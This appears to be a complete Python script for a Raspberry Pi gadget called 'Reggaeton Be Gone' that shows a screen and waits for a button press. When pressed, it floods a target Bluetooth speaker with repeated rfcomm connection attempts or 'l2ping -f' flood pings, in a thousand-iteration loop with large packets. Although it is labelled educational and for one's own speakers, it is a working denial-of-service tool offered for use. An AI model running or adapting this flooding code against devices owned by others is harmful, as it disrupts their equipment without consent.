#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Reggaeton Be Gone (Versión sin IA)
# Roni Bandini @RoniBandini https://bandini.medium.com
# February 2024 V 1.0 (Sucio y Desprolijo, as Pappo said)
# MIT License (c) 2024 Roni Bandini
# Disclaimer: este es un proyecto educativo. Úselo con sus propios altavoces BT.

import os
import subprocess
import sys
import signal
import time
import datetime
from RPi import GPIO
import Adafruit_GPIO.SPI as SPI
import Adafruit_SSD1306
from PIL import Image
from PIL import ImageDraw
from PIL import ImageFont

# Settings
myPath="/home/pi/reggaeton/"
selectedDeviceId = 1
method = 1 # 1 a 3
targetAddr = ":::::"
packagesSize = 800
threadsCount = 1000
myDelay = 0.1
forceFire = 0

# Push button
GPIO.setwarnings(False)
GPIO.setmode(GPIO.BCM)
buttonPin = 26
GPIO.setup(buttonPin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

# Oled screen
RST = None
DC = 23
SPI_PORT = 0
SPI_DEVICE = 0
disp = Adafruit_SSD1306.SSD1306_128_32(rst=RST)
disp.begin()
disp.clear()
disp.display()
font = ImageFont.truetype('whitrabt.ttf', 12)
width = disp.width
height = disp.height
image = Image.new('1', (width, height))
draw = ImageDraw.Draw(image)
draw.rectangle((0,0,width,height), outline=0, fill=0)
padding = -2
top = padding
bottom = height-padding
x = 0

# Speaker logo
image = Image.open(myPath+'images/logo.png').convert('1')
disp.image(image)
disp.display()
time.sleep(5)

def writeLog(myLine):
    now = datetime.datetime.now()
    dtFormatted = now.strftime("%Y-%m-%d %H:%M:%S")
    with open('log.txt', 'a') as f:
        myLine=str(dtFormatted)+","+myLine
        f.write(myLine+"\n")

def updateScreen(message1, message2):
    image = Image.new('1', (width, height))
    draw = ImageDraw.Draw(image)
    draw.rectangle((0,0,width,height), outline=0, fill=0)
    padding = -2
    x = 0
    top = padding
    bottom = height-padding
    draw.text((x, top+4),     "Reggaeton BeGone", font=font, fill=255)
    draw.text((x, top+16),     message1, font=font, fill=255)
    draw.text((x, top+26),     message2, font=font, fill=255)
    disp.image(image)
    disp.display()

def fireBT(method, targetAddr, threadsCount, packagesSize, myDelay):

    writeLog("Firing with method #"+str(method)+ ", pkg "+ str(packagesSize) +', target ' + targetAddr)

    if method==1:
        # Small, are you there?
        for i in range(0, threadsCount):
            print('[*] ' + str(i + 1))
            subprocess.call(['rfcomm', 'connect', targetAddr, '1'])
            time.sleep(myDelay)

    if method==2:
        # Medium, I think you should listen
        for i in range(0, threadsCount):
            print('[*] ' + str(i + 1))
            os.system('l2ping -i hci0 -s ' + str(packagesSize) +' -f ' + targetAddr)
            time.sleep(myDelay)

    if method==3:
        # XXL, Say hello to my little friend
        for i in range(0, threadsCount):
            print('[*] Sorry, Scarface method is not included in this version ' + str(i + 1))
            time.sleep(myDelay)

def signal_handler(sig, frame):
    print('Interrupted')
    writeLog("Interrupted")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def main(argv):
    print("")
    print("Reggaeton Be Gone 1.0 (Sin IA)")
    print("@RoniBandini, February 2024")
    print("Direct attack mode initiated")
    print("Waiting for button...")
    print("")

    writeLog("Started")

    # Display
    updateScreen(targetAddr, "Method #"+str(method))
    time.sleep(3)

    # Esperar a que se presione el botón
    while GPIO.input(buttonPin) == GPIO.HIGH:
            time.sleep(1)

    writeLog("Button pressed, firing")

    updateScreen("Firing speaker", "")
    print("Firing...")

    # Mostrar el logo y ejecutar el ataque
    image = Image.open(myPath+'images/logo.png').convert('1')
    disp.image(image)
    disp.display()

    fireBT(method, targetAddr, threadsCount, packagesSize, myDelay)

if __name__ == '__main__':
    main(sys.argv[1:])
